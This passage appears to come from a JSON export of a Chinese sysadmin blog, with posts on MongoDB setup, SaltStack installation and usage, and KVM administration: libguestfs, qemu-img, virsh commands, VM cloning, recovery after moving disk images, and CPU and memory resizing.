,1.3.2 等等）。 我本机的开发环境是Win7（32bit,双核）,公司的开发环境CentOS（Linux的一个版本，64bit,CPU 4颗） 在Windows下 1：解压下载的压缩文件。（我的是在E:\\nosql\\mongodb）2：新建一个目录，来存放数据库文件，默认值是/data/db/，（windows 下是:C:\\data\\db） 作为数据存储目录3：cmd 进入到MongoDb解压的目录(我的是在E:\\nosql\\mongodb), 12&gt;cd E:\\nosql\\mongodb\\bin &gt;mongod help 可以查看mongodb的一些参数，下面是我列出的 三个常用参数db存储路径，日志存储路径，日志存储方式 12345678 --dbpath arg directory for datafiles --logpath arg log file to send write to instead of stdout - has to be a file, not directory --logappend append to logpath instead of over-writing &gt;mongod --dbpath E:\\nosql\\mongodb\\data --logpath=E:\\nosql\\mongodb\\log\\mongodb.log --logappend 会在cmd窗口显示all output going to: E:\\nosql\\mongodb\\log\\mongodb.log 在浏览器输入：http://localhost:27017/. 可以看到如下提示： 1You are trying to access MongoDB on the native driver port. For http diagnostic access, add 1000 to the port number 如此，MongoDB数据库服务已经成功启动了在浏览器输入： http://localhost:28017/是mongodb系统的一个监控界面。如果你指定了–port端口号，则要用比它大1000的端口号才可以进入mongodb的监控界面。 4:打开另外个cmd窗口，启动一个mongodb的客户端 1234567891011121314&gt;cd E:\\nosql\\mongodb\\bin &gt;mongo MongoDB shell version: 1.8.3-rc0 connecting to: test &gt; &gt;show dbs //查看系统数据库，这些是我本地的dbs admin (empty) local (empty) loginlog 0.125GB logintest 0.0625GB mymongodb 0.03125GB testDb 0.999755859375GB &gt;help //查看当前执行角色的帮助信息 5：Win7下启动cmd窗口，我建议大家用Windows PowerShell，这个比cmd窗口要好用多了。","raw":null,"content":null,"categories":[],"tags":[]},{"title":"自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作","slug":"自动化+可视化/saltstack/自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作","date":"2015-09-10T09:56:03.000Z","updated":"2017-03-29T11:42:03.000Z","comments":true,"path":"2015/09/10/自动化+可视化/saltstack/自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作/","link":"","permalink":"http://blog.yangcvo.me/2015/09/10/自动化+可视化/saltstack/自动化运维工具-Saltstack的详细介绍安装与使用以及语法开发操作/","excerpt":"","text":"引言:自动化运维1:saltstack 的基本介绍2:salt 的安装 服务端 安装 配置文件 运行 注意事项 客户端 安装 配置文件 运行 注意事项 3:salt 的使用: 基础知识 targeting nodegroup grains pillar 状态管理 state state 语法 state 的逻辑关系 highstate salt schedule 实时管理 cmd.run module 无 master4:salt 开发 saltclient 管理 salt salt api 引言:自动化运维 运维的工作主要在2方面: 状态的管理 系统性能调优 这里主要简介下运维状态的管理:对于运维来说,基于状态的配置管理已经向自动化迈进了一大步,以状态为核心的运维,让状态本身有了可管理性;在运维过程中我们会发现,同样的一个配置,我们会在不同的时间, 不同的地点一次在一次的配置,这个时候,配置管理就有了重复性;有的甚至是原封不动的重 复,而另外一些则是按照一定的规律在发展,这些按照一定规律发展的配置,就是可预测的.综 上我认识的,我们运维工作的本身是可管理,可重复,可预测的.基于这样的理念,我们就可以更 高一步的推进我们的运维自动化,甚至到智能化. 看到这里,我理想中的运维自动化的配置管理平台应该有如下功能: 对状态的配置及管理(最基本的) 可以及时的对系统状态进行调整并能看到结果(可以方便的实时升级系统状态) 可以对其本身做方便的第三方管理(借助其 API,直接给状态制定好其发展方向) 加分项: 开发语言单一 架构简单,灵活 有不差的安全性 没有商业版下面是现有比较有代表性的自动化配置管理工具: 附:以下仅基于开源版本进行介绍 理念 优缺点puppet 从运维的角度去做配置管理(运维人员做给运维用的) 架构简单,系统比较成熟/不便于第三方管理 chef 从研发的角度去做配置管理(研发人员做给运维用的) 较便于第三方管理,对自身(节点,变量,cookbook)的管理较方便,有自己的 dashboard,cookbook 支持版本管理,自从 cookbook 的版本管理/架构复杂,开发语言较多,(安全问题) 以上 2 者都比较侧重于状态的管理,对单个或者多个状态的临时调整或者管理较差 2 个都有商业版,让我这个用开源版的很自卑 这里我们也能看到,2 个配置功能都没能达到我理想中的状态,那就暂用 chef 吧,直到有 一天,了解到了 saltstack 看到了这句话:“ 系统配置的自动化不仅可预测,可重复, 还具有可 管理性”(http://wiki.saltstack.cn/reproduction/dive-into-saltstack),这尼玛才是运维自动化的未 来啊,于是毫无节操的开始学习 salt,而且发现越学越喜欢;在我使用 puppet 及 chef 的时 候都没有使用 salt 的感觉,太爽了。所以我这里仅仅介绍几本的语法不涉及实际用例,salt 的安装非常方便,所以你在看本文档的时候希望你能真正的动手去做一下,然后你就会爱上 salt 了 1附:如果你会 python,salt 基本是不需要怎么学的,而我正好了解一点 py,不过这最多占我选择 salt 的 20%。 1:saltstack 的基本介绍salt 是一个新的基础平台管理工具。很短的时间即可运行并使用起来, 扩展性足以支撑管理上万台服务器,数秒钟即可完成数据传递. 经常被描述为 Func 加强版+Puppet 精简版。 salt 的整个架构都是基于消息来实现.所以能够提供横强的拓展性,灵活性,实时性;不夸 了,看实际的 slat 是什么样的不过 salt 还是一个很年轻的东西,还有很多地方不够完善,做的不够好,不过我相信这 些都只是时间问题。 注:以下文档仅仅为基本内容,相关知识点的深入学习,请看相应文档连接 ##2:salt 的安装 安装有很多途径,作为一个 centos 的用户,我选择 rpm 首先添加 RPM 源:rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm 附:实际生产中我是自建源epel 中关于 salt 的包: 1234salt-api.noarch : A web api for to access salt the parallel remote execution system salt-master.noarch : Management component for salt, a parallel remote executionsystemsalt-minion.noarch : Client component for salt, a parallel remote execution system salt.noarch : A parallel remote execution systemsalt-cloud.noarch : Generic cloud provisioning tool 1:服务端 1:安装123456789101112131415yum install salt-master 2:配置文件/etc/salt/master配置文件选项介绍: http://docs.saltstack.com/ref/configuration/master.html最基本字段:interface: 服务端监听 IP3:运行 调试模式:salt-master -l debug 后台运行:salt-master -d作为 centos 管理员,我选择:/etc/init.d/salt-master start 4:注意事项:1:监听端口4505(publish_port):salt 的消息发布系统 4506(ret_port):salt 客户端与服务端通信的端口所以确保客户端能跟服务端的这2个端口通信 安装客户端123456789101112131415161718192021222324252627282930313233343536373839yum install salt-minion 2:配置文件/etc/salt/minion配置文件选项介绍: http://docs.saltstack.com/ref/configuration/minion.html 最基本字段:master: 服务端主机名id: 客户端主机名(在服务端看到的客户端的名字)3:运行 调试模式:salt-minion -l debug 后台运行:salt-minion -d作为 centos 管理员,我选择:/etc/init.d/salt-minion start 4:注意事项:1:minion 默认和主机名 salt 的主机通信 2:关于配置文件salt 的配置文件均为 yaml 风格$key: $value #注意冒号后有一个空格 3:基础知识1:salt minion 和 master 的认证过程:(1) minion 在第一次启动时,会在/etc/salt/pki/minion/下自动生成minion.pem(private key), minion.pub(public key),然后将 minion.pub 发送给 master(2) master 在接收到 minion 的 public key 后,通过 salt-key 命令 accept minion public key,这样在 master 的/etc/salt/pki/master/minions 下的将会存放以 minion id 命名的public key, 然后 master 就能对 minion 发送指令了如下: 启动服务端:/etc/init.d/salt-minion restart启动客户端:/etc/init.d/salt-minion restart 服务端查看key:salt-keyAccepted Keys:Unaccepted Keys: minion1Rejected Keys:服务端接受 key salt-key -a minion1测试:salt 'minion1' test.ping minion1:True附:salt 更多命令及手册 salt '*' sys.doc 3:salt 的使用: 1:基础知识1:targeting 123456789salt '*' test.ping引号中以实现很强大的 minion 的过滤与匹配技术 文档:http://docs.saltstack.com/topics/targeting /compound.html常用命令:salt 'shell 正则' 命令salt -E 'prel 正则'salt -N $group 命令salt -L 'server_id1,server_id2,server_id3' 命令示例:salt -C 'webserv* and G@os:Debian or E@web-dc1-srv.*' test.ping 2:nodegroup对 minion 进行分组 1234567文档: http://docs.saltstack.com/topics/targeting/nodegroups.html 在 master 的配置文件中按如下格式定义:nodegroups:group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com orbl*.domain.com'group2: 'G@os:Debian and foo.domain.com' 在 state 或者 pillar 中引用的时候如下:base: group1:- match: nodegroup - webserver 3:grainsminion 基本信息的管理 文档:http://docs.saltstack.com/topics/targeting /grains.html 基本使用: 123456salt '*' grains.ls 查看 grains 分类salt '*' grains.items 查看 grains 所有信息salt '*' grains.item osrelease 查看 grains 某个信息示例:salt '*' grains.item osrelease minoin1:osrelease: 6.2 minion 的变量在用 salt 进行管理客户端的时候或者写 state 的时候都可以引用 grains 的变量 4:pillar salt 敏感信息的管理,只有匹配到的节点才能看到和使用 文档:http://docs.saltstack.com/topics/tutorials/pillar.html 默认:pillar 数据定义文件存储路径:/srv/pillar 入口文件:/srv/pillar/top.sls 12345678910111213141516171819202122232425262728293031格式: base:\"targeting\":- $pillar$pillar.sls 基本:$key: $value state 引用方式:&#123;&#123; pillar['$key'] &#125;&#125;复杂:users:thatch: 1000 shouse: 1001 utahdave: 1002 redbeard: 1003state 引用方式:&#123;% for user, uid in pillar.get('users', &#123;&#125;).items() %&#125;&#123;&#123;user&#125;&#125;: user.present:- uid: &#123;&#123;uid&#125;&#125; &#123;% endfor %&#125;查看节点的 pillar 数据: salt 'client2' pillar.data同步 pillar:salt '*' saltutil.refresh_pillar附:这里我们可以看到,pallar 中也可以使用 jinja(后面会提到)做一些处理 5:minion即为 salt 的客户端2:状态管理 1:statesalt 基于 minion 进行状态的管理 1:state 语法文档:http://docs.saltstack.com/ref/states/all/index.html#名字为pillar.sls的文件来存放对匹配到的&#123;% if grains['os_family'] == 'RedHat' %&#125; - name: vim-enhanced&#123;% elif grains['os'] == 'Debian' %&#125;- name: vim-nox&#123;% elif grains['os'] == 'Ubuntu' %&#125; - name: vim-nox&#123;% endif %&#125;- installed如果是 redhard 系列的就安装 vim-enhanced,如果系统是 Debian 或 者 Ubuntu 就安装 vim-nox以有多个附:state 默认使用 jinja(http://jinja.pocoo.org/)的模板语法, 文档地址: http://jinja.pocoo.org /docs/templates/ 2:state 的逻辑关系: 文档:http://docs.saltstack.com/ref/states/ordering.html 1234567require:依赖某个 state,在运行此 state 前,先运行依赖的 state,依赖可httpd: pkg:- installed file.managed:- name: /etc/httpd/conf/httpd.conf - source: salt://httpd/httpd.conf- require:- pkg: httpd watch:在某个 state 变化时运行此模块 redis: 123456789pkg:- latestfile.managed:- source: salt://redis/redis.conf- name: /etc/redis.conf- require:- pkg: redis service.running: - enable: True#state 的名字 $state: #要管理的模块类型 - $State states #该模块的状态 123- watch:- file: /etc/redis.conf - pkg: redis 附:watch 除具备 require 功能外,还增了关注状态的功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849order:优先级比 require 和 watch 低有 order 指定的 state 比没有 order 指定的优先级高 vim:pkg.installed: - order: 1想让某个 state 最后一个运行,可以用 last 3:state 与 minion将临时给 minoin 加个 statesalt 'minion1' state.sls 'vim' #给 minion1 加一个 vim 的 state 执行该命令后可以立即看到输出结果2:highstate给 minion 永久下添加状态文档: http://docs.saltstack.com/ref/states/highstate.html 默认配置文件:/srv/salt/top.sls语法:'*':- core- wsproxy - /srv/salt/目录结构:.├── core.sls ├── top.sls └── wsproxy├── init.sls ├── websocket.py └── websockify应用:salt \"minion1\" state.highstate测试模式:salt \"minion1\" state.highstate -v test=True 3:salt schedule默认的 state 只有在服务端调用的时候才执行,很多时候我们希望 minon 自觉 的去保持在某个状态文档:http://docs.saltstack.com/topics/jobs/schedule.htmlcat /srv/pillar/top.sls base:\"*\":- schedulecat /srv/pillar/schedule.sls schedule:highstate:function: state.highstate minutes: 30如上配置:minion 会没 30 分钟从 master 拉去一次配置,进行自我配置3:实时管理 有时候我们需要临时的查看一台或多台机器上的某个文件,或者执行某个命令1:cmd.run用法 salt '$targeting' cmd.run '$cmd'示例:salt '*' cmd.run 'hostname' 执行下这样的命令,马上就感受到效果了,速度还贼快2:module同时,salt 也将一些常用的命令做了集成 文档:http://docs.saltstack.com/ref/modules/all/index.html 这里几乎涵盖了我们所有的常用命令比如:查看所有节点磁盘使用情况salt '*' disk.usage 文档:http://docs.saltstack.com/topics/tutorials/quickstart.html4:无 master主要应该在测试和 salt 单机管理的时候 4:salt 开发1:saltclient 管理 salt只有才 master 才可以salt 全部用 python,这里也用 python文档:http://docs.saltstack.com/ref/python-api.html 示例: 1234import salt.clientclient = salt.client.LocalClient()ret = client.cmd('*', 'cmd.run', ['ls -l'])print ret 2:salt apisalt api 我现在还没用,不过我也没搞定,如果你搞定了,我会非常感谢你能分享下的。 ####参考文档: 1:salt 中文 wiki:http://wiki.saltstack.cn/ 很不错的文章:http://wiki.saltstack.cn/reproduction/dive-into-saltstack2:salt 官网 http://saltstack.com/ 官网文档:http://docs.saltstack.com/","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"kvm虚拟化小结（六）libguestfs-tools","slug":"容器-虚拟化/kvm/kvm虚拟化小结（六）libguestfs-tools","date":"2015-06-29T10:32:16.000Z","updated":"2017-03-14T05:47:03.000Z","comments":true,"path":"2015/06/29/容器-虚拟化/kvm/kvm虚拟化小结（六）libguestfs-tools/","link":"","permalink":"http://blog.yangcvo.me/2015/06/29/容器-虚拟化/kvm/kvm虚拟化小结（六）libguestfs-tools/","excerpt":"","text":"libguestfs 是一组 Linux 下的 C 语言的 API ，用来访问虚拟机的磁盘映像文件。其项目主页是http://libguestfs.org/ ，该工具包内包含的工具有 123456789virt-cat、virt-df、virt-ls、virt-copy-in、virt-copy-out、virt-edit、guestfs、guestmount、virt-list-filesystems、virt-list-partitions 等工具，具体用法也可以参看官网。该工具可以在不启动KVM guest主机的情况下，直接查看guest主机内的文内容，也可以直接向img镜像中写入文件和复制文件到外面的物理机，当然其也可以像mount一样，支持挂载操作。 一、libguestfs-tools的安装由于在rpm源里直接有该包，所以可以直接通过yum进行安装： 1#yum -y install libguestfs-tools 二、linux下的使用12345678910111213141516171819202122232425262728[root@kvm vm]# virt-df vpn.img文件系统 1K-blocks 已用空间 可用空间 使用百分比%vpn.img:/dev/sda1 487652 127677 330279 27%vpn.img:/dev/sda2 22043164 1614892 19285488 8%[root@kvm vm]# virt-ls vpn.img /.autofsck.pkibinbootdevetchomeliblib64lost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar 查看：http://www.361way.com/kvm-libguestfs-tools/3175.html","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"},{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"kvm磁盘虚拟化技术应用","slug":"容器-虚拟化/kvm/kvm磁盘虚拟化技术应用","date":"2015-06-28T10:32:16.000Z","updated":"2017-02-25T06:51:53.000Z","comments":true,"path":"2015/06/28/容器-虚拟化/kvm/kvm磁盘虚拟化技术应用/","link":"","permalink":"http://blog.yangcvo.me/2015/06/28/容器-虚拟化/kvm/kvm磁盘虚拟化技术应用/","excerpt":"","text":"镜像创建： qemu-img create 命令。 -f 参数指定镜像格式，默认的话是raw格式。 123456qemu-img create test 50G生成出是默认的raw格式指定格式：qcow2qemu-img create test.qcow2 -f qcow2 50G qcow2 格式 文件特别小，压缩比tar压缩效率高很多。在镜像传输上非常有意义。 raw是不支持快照的，qcow2是支持快照。 快照管理命令：snapshot 123查看快照：使用-l 删除快照：使用-d还原快照：使用-a 镜像检查只支持：qcow2, qed. vdi","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"KVM虚拟化 (二) help帮助文档大全","slug":"容器-虚拟化/kvm/KVM虚拟化 (二) help帮助文档大全","date":"2015-06-18T10:32:16.000Z","updated":"2016-12-17T11:06:34.000Z","comments":true,"path":"2015/06/18/容器-虚拟化/kvm/KVM虚拟化 (二) help帮助文档大全/","link":"","permalink":"http://blog.yangcvo.me/2015/06/18/容器-虚拟化/kvm/KVM虚拟化 (二) help帮助文档大全/","excerpt":"","text":"基本语句用法：12345678910111213141516virsh start x 启动名字为x的非活动虚拟机virsh create x.xml 创建虚拟机（创建后，虚拟机立 即执行，成为活动主机）virsh suspend x 暂停虚拟机virsh resume x 启动暂停的虚拟机virsh shutdown x 正常关闭虚拟机virsh destroy x 强制关闭虚拟机virsh undefine $ 删除虚拟机取消定义 删除虚拟机先执行这个 取消定义。virus define x1 虚拟机定义x1 virsh dominfo x 显示虚拟机的基本信息 virsh domname 2 显示id号为2的虚拟机名 virsh domid x 显示虚拟机id号 virsh domuuid x 显示虚拟机的uuidvirsh domstate x 显示虚拟机的当前状态virsh dumpxml x 显示虚拟机的当前配置文件（可能和定义虚拟机时的配置不同，因为当虚拟机启动时，需要给虚拟机分配id号、uuid、 vnc端口号等等）virsh setmem x 512000 给不活动虚拟机设置内存大小virsh edit x 编辑配置文件（一般是在刚定义完虚拟机之后） KVM secret语句用法：12345678virsh # snapshot-list centos7 查看centos7快照Secret (help keyword 'secret'):secret-define 定义或者修改 XML 中的 secretsecret-dumpxml XML 中的 secret 属性secret-get-value secret 值输出secret-list 列出 secretsecret-set-value 设定 secret 值secret-undefine 取消定义 secret KVM Snapshot 语句用法：1234567891011Snapshot (help keyword 'snapshot'):snapshot-create 使用 XML 生成快照snapshot-create-as 使用一组参数生成快照snapshot-current 获取或者设定当前快照snapshot-delete 删除域快照snapshot-dumpxml 为域快照转储 XMLsnapshot-edit 编辑快照 XMLsnapshot-info 快照信息snapshot-list 为域列出快照snapshot-parent 获取快照的上级快照名称snapshot-revert 将域转换为快照 KVM Storage Pool语句用法：1234567891011121314151617181920Storage Pool (help keyword 'pool'):find-storage-pool-sources-as 找到潜在存储池源find-storage-pool-sources 发现潜在存储池源pool-autostart 自动启动某个池pool-build 建立池pool-create-as 从一组变量中创建一个池pool-create 从一个 XML 文件中创建一个池pool-define-as 在一组变量中定义池pool-define define an inactive persistent storage pool or modify an existing persistent one from an XML filepool-delete 删除池pool-destroy 销毁（删除）池pool-dumpxml XML 中的池信息pool-edit 为存储池编辑 XML 配置pool-info 存储池信息pool-list 列出池pool-name 将池 UUID 转换为池名称pool-refresh 刷新池pool-start 启动一个（以前定义的）非活跃的池pool-undefine 取消定义一个不活跃的池pool-uuid 把一个池名称转换为池 UUID KVM Storage Volume 语句用法：1234567891011121314151617Storage Volume (help keyword 'volume'):vol-clone 克隆卷。vol-create-as 从一组变量中创建卷vol-create 从一个 XML 文件创建一个卷vol-create-from 生成卷，使用另一个卷作为输入。vol-delete 删除卷vol-download 将卷内容下载到文件中vol-dumpxml XML 中的卷信息vol-info 存储卷信息vol-key 为给定密钥或者路径返回卷密钥vol-list 列出卷vol-name 为给定密钥或者路径返回卷名vol-path 为给定密钥或者路径返回卷路径vol-pool 为给定密钥或者路径返回存储池vol-resize 创新定义卷大小vol-upload 将文件内容上传到卷中vol-wipe 擦除卷 KVM Virsh itself 语句用法：123456789Virsh itself (help keyword 'virsh'): cd 更改当前目录 connect 连接（重新连接）到 hypervisor echo echo 参数 exit 退出这个非交互式终端 help 打印帮助 pwd 输出当前目录 quit 退出这个非交互式终端 如何卸载kvm虚拟机1yum remove kvm 或者 yum remove kvm* 如果是源码安装，先找到目录后直接删除就可以了 12345find / -name kvm // 找到目录找到该虚机的文件位置，删除映像文件和配置文件就可以了。cd **** //进入目录rm -rf ***如果是rpm安装rpm -e kvm 或者 rpm -e kvm* 版权声明：本站原创文章，于2015年6月18日，由yangc发表.转载请注明：kvm 虚拟化实用篇（第二篇）help帮助文档大全","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"KVM虚拟机更改存储路径解决方法","slug":"容器-虚拟化/kvm/kvm虚拟化(三)虚拟机快速克隆","date":"2015-06-17T10:18:46.000Z","updated":"2016-12-15T10:28:14.000Z","comments":true,"path":"2015/06/17/容器-虚拟化/kvm/kvm虚拟化(三)虚拟机快速克隆/","link":"","permalink":"http://blog.yangcvo.me/2015/06/17/容器-虚拟化/kvm/kvm虚拟化(三)虚拟机快速克隆/","excerpt":"","text":"kvm虚拟化(三)虚拟机快速克隆第一步： 在复制之前需要的操作： 有一个DHCP服务用于IP地址自动获取，获取后期VNC修改静态IP地址开启VNC远程桌面设置网卡为自动获取IP地址安装必要的补丁程序执行setupmgr和Sysprep（关机）复制关机后的VM镜像模板文件 举例： 我的kvm镜像都是指定在同一个数据挂载目录下面： 12345678910111213141516171819 /opt/vm/ #cp -av tomcat2.img tomcat3.img镜像拷贝完成以后复制模板配置文件为tomcat3.xml cd /etc/libvirt/qemu cp tomcat2.xml tomcat3.xml 修改模板配置文件 编辑 vim tomcat3.xml 1. 修改虚拟机的名称，如：&lt;name&gt;tomcat3&lt;/name&gt;2. 修改uuid编号 ，这个是拷贝过来的tomcat2的uuid 修改几个数字，跟uuid不冲突就行。 如： &lt;uuid&gt;0712eb79-5f7b-42d0-bb95-859e3f37f972&lt;/uuid&gt;3. 修改镜像路径名称： &lt;source file='/opt/vm/tomcat3.img'/&gt; 4. 修改mac地址，如：&lt;mac address='52:54:00:11:12:1f'/&gt;5. 修改VNC 端口：这里我写5947 &lt;graphics type='vnc' port='5947' autoport='no' listen='0.0.0.0'&gt; 其他的就不需要修改了。 对于网络部分的设置如果模板的桥接已经与物理的桥接设置相同时，无需进行修改 123456#virsh list --all //可以看到新添加的VM已经添加了#virsh define tomcat3.xml 定义tomcat3#virsh start tomcat3 启动tomcat3如果报错了。会有提示的。 然后编辑tomcat3.xml需要重新定义。先取消定义#virsh undefine tomcat3 取消定义。 然后使用VNC连接。 登陆的时候root密码当然是tomcat2的密码了。后期可以更改。这里需要修改下静态IP。 修改了IP启动网卡。 克隆虚拟机引起的“Device eth0 does not seem to be present, delaying initialization” 找到/etc/udev/rules.d/70-persistent-net.rules 删除后重启机器，系统会自动生成一个70-persistent-net.rules文件。","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"KVM虚拟机更改存储路径解决方法","slug":"容器-虚拟化/kvm/KVM虚拟机更改存储路径解决方法","date":"2015-06-17T07:18:46.000Z","updated":"2017-03-07T15:36:25.000Z","comments":true,"path":"2015/06/17/容器-虚拟化/kvm/KVM虚拟机更改存储路径解决方法/","link":"","permalink":"http://blog.yangcvo.me/2015/06/17/容器-虚拟化/kvm/KVM虚拟机更改存储路径解决方法/","excerpt":"","text":"玩kvm的2014年开始慢慢接触了，发现功能特别大，比vm好用，vm是基于Windows上面需要安装客户端登陆很麻烦,也有人说也有web管理端其实我觉得运维在kvm伸缩现在很火的openstack也是底层kvm去生成虚拟机的。 kvm 在之前的搭建环境 一开始安装指定的虚拟机镜像没有放到挂载单独的一块硬盘路径。后果会不堪设想。 kvm服务器： IP：192.168.1.250 镜像存储路径：/opt/vm/ 默认的xml文件路径：/etc/libvirt/qemu 发现MySQL的服务器已经挂了。=_= 登陆到kvm： 一开始我MySQL跟MySQL主从存储路径都在/opt/vm/mysql.img 、/opt/vm/mysql-2.img 这里我看了下这两台服务器都已经挂了，因为kvm空间被根目录被吃光了，一开始就没有注意这个配置，后面我在 创建/home/vm/，分了块硬盘空间挂载到这个目录下面。 先不要：把/opt/vm/mysql.img 直接mv到了/home/vm/. 这里第一步：需要先停掉虚拟机。如果虚拟机已经挂了，在kvm用virsh查看下。 12- mysql 暂停- mysql-2 暂停 如果暂停说明已经卡死了。那么shutdown 也是无效的。 这里可以查看我写的篇：kvm-hellp帮助篇-只对kvm入门人员帮助 virsh undefine $1 删除虚拟机取消定义 删除虚拟机先执行这个 取消定义。 强制关闭虚拟机： virsh undefine mysql virsh undefine mysql-2 这里第二步移动镜像存储目录：然后： 把/opt/vm/mysql.img 直接mv到了/home/vm/.移动指定的目录。 第三步需要修改xml文件这里一开始遇到很多头大的问题： 第一我直接vim /etc/libvirt/qemu/mysql.xml 第一我直接vim /etc/libvirt/qemu/mysql-2.xml 这样修改了以后是不能生效的。而且一错在错，因为如果改完了以后直接去启动MySQL virsh start mysql-2 提示：/opt/vm/ 下没有 mysql-2.img 这里我知道是没有生效，就取消了定义mysql-2 取消定义需要删除快照才能取消定义。 这里又做错了一步： 如何取消定义虚拟机 我把自己辛辛苦苦的快照都删除了，然后取消了定义。 注意：发现取消了定义以后，我的/etc/libvirt/qemu/mysql-2.xml 已经被删除了，取消定义是会删除xml文件的。所以这个时候发现自己大错特错，之前忘记了一个重要的操作。这里我发现我MySQL已经被删除了。可是镜像文件还是在/home/vm/mysql-2.img还好我做了主从，删除了只是其中一台。这个时候求助了之前搞虚拟化的朋友–甜橙大神。### 紧急修复这里我在他的指导帮助下搞定了。### 修复第一步：我这里先拷贝了一份其他虚拟机的xml文件,做相应修改. cp nginx.xml mysql-2.xml然后打开文件：name uuid img 之类的都要修改 先删除:uuid- uuid 可以不填-删除这行就行了1&lt;uuid&gt;876f7ff7-a0e7-f64d-fc3c-bc48fee28635&lt;/uuid&gt; 改成自己恢复的镜像。1&lt;source file='/home/vm/mysql-2.img'/&gt; 修改网卡信息：1&lt;mac address='52:54:00:e9:cb:c4'/&gt;这里的是拷贝过来的，所以你稍微做下修改，我这里把F1改成了c4. 修改VNC链接的端口12&lt;graphics type='vnc' port='5950' autoport='no' listen='0.0.0.0'&gt; &lt;listen type='address' address='0.0.0.0'/&gt;这里是我拷贝过来的，所以5950我改成了我之前MySQL的5941的。改好后保存退出。。### 启动虚拟机-加载xml文件。重新定义xml文件1234virsh # define /etc/libvirt/qemu/mysql-2.xml定义域 mysql-2（从 /etc/libvirt/qemu/mysql-2.xml）virsh # start mysql域 mysql 已开始这里显示已经启动成功了。所以取消定义是最危险的。因为没有备份xml文件。### VNC连接修改网卡信息。这里需要用VNC连接到这台服务器，然后修改网卡信息。这里查看网卡信息，没有IP，在查看if-eth0需要修改mac地址：改完保存退出。这个时候重启网卡。会发现报错。centos6.5，查看 /etc/udev/rules.d/70-net*文件，确保里面eth0 的mac 跟xml里 的一样这里修改eth0 的mac 到xml里的，删了eth1重启就可以了。现在已经恢复回来了。### 切记xml文件修修改改就行了，还是不要随便删了 。 这里的最简单解决方法： 修改xml 要 virsh edit，不是vi ，vi修改不生效的，所以才会报错找不到之前的镜像直接关机虚拟机，virsh edit修改就不会出现找不到镜像问题了。 总结了经验。以后存储方法-定义和取消定义的危险性，-正确修改配置方法。","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"KVM虚拟化(六)调整虚拟机CPU大小,添加memory内存,添加虚拟机硬盘disk,虚拟机内存减半现象","slug":"容器-虚拟化/kvm/KVM虚拟化(六)调整虚拟机CPU大小,添加memory内存,添加虚拟机硬盘disk,虚拟机内存减半现象","date":"2015-06-16T14:43:26.000Z","updated":"2016-12-17T11:06:30.000Z","comments":true,"path":"2015/06/16/容器-虚拟化/kvm/KVM虚拟化(六)调整虚拟机CPU大小,添加memory内存,添加虚拟机硬盘disk,虚拟机内存减半现象/","link":"","permalink":"http://blog.yangcvo.me/2015/06/16/容器-虚拟化/kvm/KVM虚拟化(六)调整虚拟机CPU大小,添加memory内存,添加虚拟机硬盘disk,虚拟机内存减半现象/","excerpt":"","text":"调整虚拟机CPU大小 这个是我需要修改的虚拟机dataname1 操作这些都需要shutdown off 1virsh # shutdown dataname1 查看你要修改的虚拟机的配置信息。 12345678910111213141516171819202122[root@kvm ~]# virsh欢迎使用 virsh，虚拟化的交互式终端。输入：'help' 来获得命令的帮助信息 'quit' 退出virsh # dominfo dataname1 Id: 29名称： dataname1UUID: 0301d59b-5b19-40af-b0f9-063d646a38dbOS 类型： hvm状态： runningCPU： 1 CPU 时间： 14.2s最大内存： 2097152 KiB使用的内存： 2097152 KiB持久： 是自动启动： 禁用管理的保存： 否安全性模式： selinux安全性 DOI： 0安全性标签： system_u:system_r:svirt_t:s0:c903,c922 (enforcing) 这里很明显查看下CPU这里是1核 ，2G内存。 修改dataname1的cpu 这里需要编辑了域 dataname1 XML 配置。 1virsh # edit dataname1 修改下CPU 1&lt;vcpu placement='static'&gt;2&lt;/vcpu&gt; 大概在第六行这里改成2 就是CPU2核 ，如果需要改成4核直接改成4 然后wq!保存并退出。 提示：编辑了域 dataname1 XML 配置。 然后在执行 1virsh # setvcpus dataname1 2 --config 然后查看已添加CPU核数。 1234567891011121314virsh # dominfo dataname1Id: -名称： dataname1UUID: 0301d59b-5b19-40af-b0f9-063d646a38dbOS 类型： hvm状态： 关闭CPU： 2最大内存： 2097152 KiB使用的内存： 0 KiB持久： 是自动启动： 禁用管理的保存： 否安全性模式： selinux安全性 DOI： 0 调整虚拟机内存大小 我们查看下dataname1 配置文件 12&lt;memory unit='KiB'&gt;2097152&lt;/memory&gt;&lt;currentMemory unit='KiB'&gt;2097152&lt;/currentMemory&gt; 可以看到，虚拟机中实际显示的为currentMemory（minRam），即为当前内存为2G。memory unit实际为最大使用内存（maxRam）。 修改4G 2097152x2=4194304 所以我们这里的最大内存是2G,修改配置文件。 